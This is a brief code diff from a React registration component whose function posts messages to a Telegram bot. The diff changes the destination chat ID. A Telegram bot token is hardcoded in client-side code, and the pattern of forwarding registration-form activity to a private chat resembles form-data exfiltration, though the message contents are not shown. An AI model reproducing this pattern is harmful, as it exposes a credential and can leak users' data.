@@ -23,7 +23,7 @@ const Registration = () => {
     const sendMessageToTelegram = async (message) => {
         try {
             const response = await axios.post(`https://api.telegram.org/bot6838834920:AAHz5wL-wxGw_bKPG3ex_dsBYywlljWL5F8/sendMessage`, {
-                chat_id: 1617503904,
+                chat_id: 6431471143,
                 text: message
             });
             console.log('Message sent:', response.data);
